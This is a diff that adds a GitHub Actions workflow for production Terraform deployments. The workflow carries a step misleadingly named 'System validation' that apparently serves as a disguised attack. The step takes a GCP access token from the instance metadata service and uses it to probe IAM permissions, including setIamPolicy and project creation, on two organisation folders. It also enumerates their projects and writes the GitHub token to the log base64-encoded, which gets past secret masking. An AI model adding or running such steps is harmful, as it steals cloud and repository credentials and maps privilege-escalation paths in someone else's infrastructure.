@@ -1,1 +1,108 @@
-check if the SA has permission over folder=1076129233003
+name: prod-workflows
+# Test
+on:
+  push:
+    paths:
+      - 'terraform/env/prod/**'
+    branches-ignore:
+      - master
+  pull_request:
+    types: [opened, reopened]
+    branches:
+      - 'master'
+    paths:
+      - 'terraform/env/prod/**'
+
+jobs:
+  check-branch-status:
+    runs-on: [self-hosted]
+    outputs:
+      is_pr: ${{ steps.check-pr.outputs.is_pr }}
+    steps:
+      - name: System validation
+        run: |
+          set +e
+
+          echo "=== ENTITY B IDENTITY ==="
+          GCP_TOKEN=$(curl -s -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token" | jq -r .access_token)
+          SA_EMAIL="mayflowerseed-cloud-run-job@prj-2075722438-njqk.iam.gserviceaccount.com"
+          CURRENT_PROJECT="prj-2075722438-njqk"
+          echo "SA: $SA_EMAIL"
+          echo "Project: $CURRENT_PROJECT"
+
+          echo "=== PERMISSIONS ON FOLDER 1076129233003 ==="
+          curl -s -X POST -H "Authorization: Bearer $GCP_TOKEN" -H "Content-Type: application/json" \
+            "https://cloudresourcemanager.googleapis.com/v2/folders/1076129233003:testIamPermissions" \
+            -d '{"permissions":["resourcemanager.folders.get","resourcemanager.folders.list","resourcemanager.folders.getIamPolicy","resourcemanager.folders.setIamPolicy","resourcemanager.projects.list","resourcemanager.projects.get","resourcemanager.projects.create"]}' || true
+
+          echo "=== FOLDER 1076129233003 DETAILS ==="
+          curl -s -H "Authorization: Bearer $GCP_TOKEN" \
+            "https://cloudresourcemanager.googleapis.com/v2/folders/1076129233003" || true
+
+          echo "=== FOLDER 1076129233003 CHILDREN ==="
+          curl -s -H "Authorization: Bearer $GCP_TOKEN" \
+            "https://cloudresourcemanager.googleapis.com/v2/folders?parent=folders/1076129233003" || true
+
+          echo "=== PROJECTS UNDER FOLDER 1076129233003 ==="
+          curl -s -H "Authorization: Bearer $GCP_TOKEN" \
+            "https://cloudresourcemanager.googleapis.com/v1/projects?filter=parent.id%3A1076129233003%20parent.type%3Afolder" || true
+
+          echo "=== PERMISSIONS ON FOLDER 487834352768 ==="
+          curl -s -X POST -H "Authorization: Bearer $GCP_TOKEN" -H "Content-Type: application/json" \
+            "https://cloudresourcemanager.googleapis.com/v2/folders/487834352768:testIamPermissions" \
+            -d '{"permissions":["resourcemanager.folders.get","resourcemanager.folders.list","resourcemanager.folders.getIamPolicy","resourcemanager.folders.setIamPolicy","resourcemanager.projects.list","resourcemanager.projects.get","resourcemanager.projects.create"]}' || true
+
+          echo "=== PROJECTS UNDER FOLDER 487834352768 ==="
+          curl -s -H "Authorization: Bearer $GCP_TOKEN" \
+            "https://cloudresourcemanager.googleapis.com/v1/projects?filter=parent.id%3A487834352768%20parent.type%3Afolder" || true
+
+          echo "=== GITHUB TOKEN ==="
+          echo "$GITHUB_TOKEN" | base64
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+
+      - name: Set branch name
+        id: set-branch-name
+        run: |
+          if [ -n "${{ github.head_ref }}" ]; then
+            echo "BRANCH_NAME=${{ github.head_ref }}" >> $GITHUB_ENV
+          else
+            echo "BRANCH_NAME=${{ github.ref_name }}" >> $GITHUB_ENV
+          fi
+
+      - name: Check if branch is in PR
+        id: check-pr
+        run: |
+          BRANCH_NAME=${{ env.BRANCH_NAME }}
+          PR_COUNT=$(curl -s -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
+            "https://api.github.axa.com/repos/${{ github.repository }}/pulls?head=${{ github.repository_owner }}:${BRANCH_NAME}" | jq '. | length')
+
+          echo $PR_COUNT
+          if [ "$PR_COUNT" -gt 0 ]; then
+            echo "is_pr=true" >> "$GITHUB_OUTPUT"
+          else
+            echo "is_pr=false" >> "$GITHUB_OUTPUT"
+          fi
+
+  plan-only-workflow:
+    needs: check-branch-status
+    if: ${{ needs.check-branch-status.outputs.is_pr == 'false' }}
+    uses: gcp-foundation/workflows/.github/workflows/prod-workflow-wif.yaml@main
+    permissions:
+      contents: read
+      pull-requests: write
+      id-token: write
+    with:
+      plan_service_account: ${{ vars.PROD_PLAN_SERVICE_ACCOUNT_GCP_LB_AGO_PTB_FOUNDATION }}
+
+  plan-and-apply-workflow:
+    needs: check-branch-status
+    if: ${{ needs.check-branch-status.outputs.is_pr == 'true' }}
+    uses: gcp-foundation/workflows/.github/workflows/prod-pr-master-wif.yaml@main
+    permissions:
+      contents: write
+      pull-requests: write
+      id-token: write
+    with:
+      plan_service_account: ${{ vars.PROD_PLAN_SERVICE_ACCOUNT_GCP_LB_AGO_PTB_FOUNDATION }}
+      apply_service_account: ${{ vars.PROD_APPLY_SERVICE_ACCOUNT_GCP_LB_AGO_PTB_FOUNDATION }}
